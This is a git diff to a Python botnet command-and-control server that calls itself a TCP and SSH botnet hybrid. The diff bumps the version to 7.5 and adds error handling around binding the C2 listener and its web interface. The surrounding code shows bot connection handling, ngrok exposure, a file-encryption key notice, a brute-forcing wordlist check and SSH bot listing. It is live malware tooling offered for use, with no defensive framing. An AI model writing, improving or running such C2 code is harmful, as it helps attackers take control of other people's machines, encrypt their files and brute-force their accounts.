@@ -175,7 +175,7 @@ class Botnet:
                 self.log(
                     "\n[(ERROR)]: Error starting up server - Brute-forcing file is not in directory!\n[(CLOSE)]: Server is closing.....")
             sys.exit()
-        self.version = "7.0"
+        self.version = "7.5"
         self.connportlist = []
         self.conn_list = []
         self.admin_conn = []
@@ -197,23 +197,27 @@ class Botnet:
             self.ngrokport = self.port
         self.listenforconn = True
         self.botscript = self.bot_script()
+        self.working = False
         self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             self.serv.bind((ip, port))
+            self.working = True
         except Exception as e:
+            self.working = False
             self.logo()
             print("[+] The Server cannot be started! Check the logs for more info.")
             self.log(f"\n[(ERROR)]: Unable to bind IP and Port due to: {e}")
             sys.exit()
-        self.adminconfig = threading.Thread(target=self.configure_adminfile)
-        self.adminconfig.start()
-        self.cwd = os.getcwd()
-        self.listener = threading.Thread(target=self.listen)
-        self.listener.start()
-        self.logo()
-        self.savefile = False
-        self.displaykeys = False
-        self.welcomemsg = """
+        if self.working:
+            self.adminconfig = threading.Thread(target=self.configure_adminfile)
+            self.adminconfig.start()
+            self.cwd = os.getcwd()
+            self.listener = threading.Thread(target=self.listen)
+            self.listener.start()
+            self.logo()
+            self.savefile = False
+            self.displaykeys = False
+            self.welcomemsg = """
 [(SERVER)]: 
 [+] List of Commands:
 [+] !help                                - Displays this message.
@@ -263,30 +267,30 @@ class Botnet:
 [+] !listsshbots                         - Lists all SSH Bots
 
 [+] Any other commands will be made into cmd commands.
-                """
-        item = f"\n[(SERVER)]: Server started: {datetime.datetime.today()}\n[(SERVER)]: Successfully started server on: {self.ngroklink}:{self.ngrokport}\n[(SERVER)]: Listening for connections.....\n[(SERVER)]: Encryption key used: {self.key}"
-        self.log(item)
-        print(f"\n[+] Hosting Server at {self.ngroklink}:{self.ngrokport}")
-        print("[+] Web-Interface For More Info: http://127.0.0.1:8080")
-        print("[+] Botnet is Up! Listening for connections.....\n")
-        print(f"[+] This Server is being logged!\n[+] Server Log File: {self.logfile}")
-        print(f"\n[+] Use this token when encrypting!: {key}")
-        print("[+] Notice that this token will be used if encrypting files(probably save it).")
-        self.usage()
-        self.instructor = threading.Thread(target=self.instruct)
-        self.instructor.start()
+                            """
+            item = f"\n[(SERVER)]: Server started: {datetime.datetime.today()}\n[(SERVER)]: Successfully started server on: {self.ngroklink}:{self.ngrokport}\n[(SERVER)]: Listening for connections.....\n[(SERVER)]: Encryption key used: {self.key}"
+            self.log(item)
+            print(f"\n[+] Hosting Server at {self.ngroklink}:{self.ngrokport}")
+            print("[+] Web-Interface For More Info: http://127.0.0.1:8080")
+            print("[+] Botnet is Up! Listening for connections.....\n")
+            print(f"[+] This Server is being logged!\n[+] Server Log File: {self.logfile}")
+            print(f"\n[+] Use this token when encrypting!: {key}")
+            print("[+] Notice that this token will be used if encrypting files(probably save it).")
+            self.usage()
+            self.instructor = threading.Thread(target=self.instruct)
+            self.instructor.start()
 
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _         ______ ___  
- / ____|           (_)   | | \ | |    | |       |____  |__ \ 
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __ / /   ) |
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / // /   / / 
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V // /   / /_ 
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_//_(_) |____|
-           | |                                               
-           |_|                                                                                                                                           
+  _____             _     _ _   _      _         ______ _____ 
+ / ____|           (_)   | | \ | |    | |       |____  | ____|
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __ / /| |__  
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / // / |___ \ 
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V // /   ___) |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_//_(_) |____/ 
+           | |                                                
+           |_|                                                                                                                                    
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -5107,17 +5111,23 @@ class Web_Interface:
     info about this script. There are some important info about some of the important
     variables in the server, so that the User can learn more about it."""
     def __init__(self, ip, port):
-        """Initiation of the server, also where all the important variables are defined,
+        """Initiation of the web-server, also where all the important variables are defined,
         as well as the starting of the server and threads."""
         self.ip = "localhost"
         self.port = port
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server.bind((ip, port))
-        self.packet = ""
-        self.listener = threading.Thread(target=self.listen)
-        self.listener.start()
-        self.packets = threading.Thread(target=self.packetmaker)
-        self.packets.start()
+        self.working = False
+        try:
+            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server.bind((ip, port))
+            self.working = True
+        except Exception as e:
+            print(f"\n[+] Web-Interface is unable to start due to error: {e}")
+        if self.working:
+            self.packet = ""
+            self.listener = threading.Thread(target=self.listen)
+            self.listener.start()
+            self.packets = threading.Thread(target=self.packetmaker)
+            self.packets.start()
     def packetmaker(self):
         """This function generates the packet to send
         to the client and also for updating the Web-Interface."""
